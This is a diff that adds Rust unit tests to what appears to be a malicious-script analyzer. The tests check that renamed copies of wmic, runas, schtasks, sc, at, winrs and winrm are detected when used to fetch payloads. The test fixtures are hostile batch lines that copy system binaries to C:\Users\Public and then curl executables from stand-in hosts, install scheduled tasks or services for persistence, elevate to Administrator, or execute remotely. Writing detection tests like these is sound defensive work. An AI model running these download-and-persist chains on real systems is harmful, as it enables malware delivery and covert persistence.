@@ -22526,6 +22526,301 @@ C:\Users\Public\ff.tmp /m *.txt /c "cmd /c curl -o out.exe https://copied-forfil
     }
 
     #[test]
+    fn copied_wmic_alias_process_call_create_child_is_analyzed() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp process call create "cmd /c curl -o out.exe https://copied-wmic.example/p.exe""#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\wm.tmp"#
+                )
+            }),
+            "copied wmic alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WmicProcessCreate { inner_cmd }
+                        if inner_cmd == "cmd /c curl -o out.exe https://copied-wmic.example/p.exe"
+                )
+            }),
+            "copied wmic alias did not emit WmicProcessCreate: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-wmic.example/p.exe"
+                            && dst.as_deref() == Some("out.exe")
+                )
+            }),
+            "copied wmic child download not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_runas_alias_replays_quoted_child_command() {
+        let script = br#"copy C:\Windows\System32\runas.exe C:\Users\Public\ra.tmp
+C:\Users\Public\ra.tmp /user:Administrator "cmd.exe /c curl -o out.exe https://copied-runas.example/payload.exe""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\ra.tmp"#
+            )),
+            "copied runas alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("copied-runas.example"))
+            )),
+            "copied runas SelfElevation not detected: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-runas.example/payload.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "copied runas child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_schtasks_alias_create_tr_recurses_into_nested_download() {
+        let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
+C:\Users\Public\st.tmp /create /tn "Updater" /tr "cmd /c curl -o out.exe https://copied-schtasks.example/p.exe" /sc once /st 00:00 /f
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\st.tmp"#
+            )),
+            "copied schtasks alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "Updater"
+                        && command == "cmd /c curl -o out.exe https://copied-schtasks.example/p.exe"
+            )),
+            "copied schtasks persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-schtasks.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "copied schtasks nested action download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_sc_alias_create_binpath_cmd_child_is_analyzed() {
+        let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
+C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.exe https://copied-sc-binpath.example/payload.exe""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\svc.tmp"#
+            )),
+            "copied sc alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("copied-sc-binpath.example")
+            )),
+            "copied sc service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-sc-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied sc binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_at_alias_scheduled_cmd_child_is_analyzed() {
+        let script = br#"copy C:\Windows\System32\at.exe C:\Users\Public\at.tmp
+C:\Users\Public\at.tmp 23:59 cmd.exe /c curl -o payload.exe https://copied-at.example/payload.exe"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\at.tmp"#
+            )),
+            "copied at alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "AtJob"
+                        && key == "23:59"
+                        && value_name == "command"
+                        && command == "cmd.exe /c curl -o payload.exe https://copied-at.example/payload.exe"
+            )),
+            "copied at scheduled command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-at.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied at scheduled child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_winrs_alias_replays_remote_cmd_child() {
+        let script = br#"copy C:\Windows\System32\winrs.exe C:\Users\Public\wr.tmp
+C:\Users\Public\wr.tmp -r:target.example cmd.exe /V:ON /c set U=https://copied-winrs.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\wr.tmp"#)
+            )),
+            "copied winrs alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-winrs.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied winrs remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrs" && target_host == "target.example"
+            )),
+            "copied winrs remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_winrm_alias_replays_remote_cmd_child() {
+        let script = br#"copy C:\Windows\System32\winrm.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /V:ON /c set U=https://copied-winrm.example/payload.exe&&curl -o payload.exe !U!";CurrentDirectory="C:\Windows"}"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\wm.tmp"#)
+            )),
+            "copied winrm alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-winrm.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied winrm remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrm" && target_host == "target.example"
+            )),
+            "copied winrm remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn winrm_exe_invoke_emits_remote_exec() {
+        let script = br#"winrm.exe invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /V:ON /c set U=https://winrm-exe-wrapper.example/payload.exe&&curl -o payload.exe !U!";CurrentDirectory="C:\Windows"}"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://winrm-exe-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "winrm.exe remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrm" && target_host == "target.example"
+            )),
+            "winrm.exe remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_mshta_alias_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
